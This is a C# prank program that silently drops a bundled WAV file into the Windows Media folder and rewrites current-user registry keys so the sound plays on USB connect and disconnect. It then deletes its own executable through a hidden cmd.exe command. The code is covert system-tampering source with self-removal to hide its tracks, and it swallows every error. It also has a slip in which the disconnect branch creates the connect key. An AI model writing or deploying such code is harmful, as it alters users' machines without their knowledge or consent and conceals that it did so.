using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Yamete_Kudasai_USB_San.Properties;
using static System.Net.Mime.MediaTypeNames;

namespace Yamete_Kudasai_USB_San
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try

            {
                //if payload sound not exists - load from resources, unzip, save and delete zip
                if (!File.Exists(@"C:\Windows\Media\insertoutput.wav"))

                {

                    File.WriteAllBytes(@"C:\Windows\Media\insertoutput.zip", Resources.insertoutput);
                    ZipFile.ExtractToDirectory(@"C:\Windows\Media\insertoutput.zip", @"C:\Windows\Media\");
                    File.Delete(@"C:\Windows\Media\insertoutput.zip");
                }

            }

            catch { }


            //if registry key is null, create it - and-else set Device(Dis)Connect sound source to the path of the payload Sound
            try
            {
                RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current", true);

                if (regKey == null)

                {

                    regKey = Registry.CurrentUser.CreateSubKey(@"AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current");

                }

                 regKey.SetValue("", @"C:\Windows\Media\insertoutput.wav", RegistryValueKind.String);

            } 
            catch { }


            try
            {
                RegistryKey regKey2 = Registry.CurrentUser.OpenSubKey(@"AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current", true);

                if (regKey2 == null)

                {

                    regKey2 = Registry.CurrentUser.CreateSubKey(@"AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current");

                }

                regKey2.SetValue("", @"C:\Windows\Media\insertoutput.wav", RegistryValueKind.String);

            }
            catch { }


            try
            {
                //self-delete after 1 second
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
        } 
            catch { }
        }
    }
}
